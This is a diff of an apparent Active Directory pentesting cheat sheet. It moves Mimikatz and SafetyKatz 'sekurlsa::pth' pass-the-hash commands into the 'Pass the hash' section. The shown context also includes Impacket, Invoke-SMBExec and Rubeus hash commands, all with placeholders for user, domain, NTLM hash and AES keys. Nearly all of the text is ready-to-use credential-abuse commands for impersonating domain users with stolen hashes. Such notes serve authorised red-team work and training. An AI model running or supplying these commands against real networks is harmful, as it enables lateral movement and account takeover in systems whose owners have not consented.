@@ -63,6 +63,17 @@ Find-PSRemotingLocalAdminAccess
 ```
 
 ## Pass the hash
+#### Mimikatz pass the hash
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
+```
+
+#### SafetyKatz pass the hash
+```
+SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
+```
+
 #### Impacket
 - Use the empty lm hash ```00000000000000000000000000000000```
 - https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries
@@ -105,17 +116,6 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 #### Calculate NTLM hash
 ```
 .\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
-```
-
-#### Mimikatz overpass the hash
-```
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
-```
-
-#### SafetyKatz
-```
-SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
 ```
 
 #### Rubeus
